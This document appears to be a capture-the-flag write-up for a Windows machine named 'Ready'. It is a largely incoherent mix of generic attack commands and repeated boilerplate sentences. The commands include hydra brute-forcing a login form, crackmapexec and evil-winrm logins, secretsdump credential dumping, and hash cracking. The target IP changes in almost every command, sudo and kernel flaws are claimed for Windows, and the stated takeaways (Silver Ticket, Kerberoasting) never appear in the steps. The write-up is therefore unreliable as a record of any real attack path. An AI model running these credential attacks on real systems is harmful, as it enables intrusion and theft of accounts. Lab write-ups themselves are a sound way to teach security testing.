---
TitleSEO: "VulnHub — Ready (Hard Windows) | ZureFX"
TitlePost: "VulnHub — Ready (Hard Windows)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Ready. Silver Ticket and Kerberoasting to achieve hard compromise on Windows."
Keywords: "windows, ctf, reversing, linux, pwntilldawn, hard"
URL: "https://zurefx.github.io/writeups/htb-ready-588.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-ready-588/"
Date: "2025-07-30"
Tags: "Windows, CTF, Reversing, Linux, PwnTillDawn, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-ready-588"
Permalink: "/writeups/htb-ready-588.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Ready** is rated **Hard** on VulnHub. It runs **Windows** and the IP address during this analysis was `10.99.34.187`.

### Objectives

Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p587,636,587 10.31.170.146 -oN scan.txt
```

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit.

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
nmap -sCV -p135,23,143 10.107.239.214 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.124.3.87 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.67.164.190/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

### SMB Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
crackmapexec smb 10.13.206.170 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.50.77.116/FUZZ
evil-winrm -i 10.74.72.184 -u administrator -p 'P@ssw0rd!'
```

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

## Exploitation

### Vulnerability Identification

Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality.

Key finding: **XSS**.

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services.

### Initial Access

The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory.

```bash
gobuster dir -u http://10.92.95.144/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.63.209.199 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code.

## Privilege Escalation

### Enumeration

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
crackmapexec smb 10.18.107.49 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.109.63.217 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality.

```powershell
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.89.144.160
nmap -sCV -p443,3268,8888 10.79.203.52 -oN scan.txt
```

The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials.

## Summary

### Tools Used

- `GetNPUsers`
- `gobuster`
- `socat`
- `evil-winrm`
- `nikto`

### Key Takeaways

- Silver Ticket
- Kerberoasting
- XSS
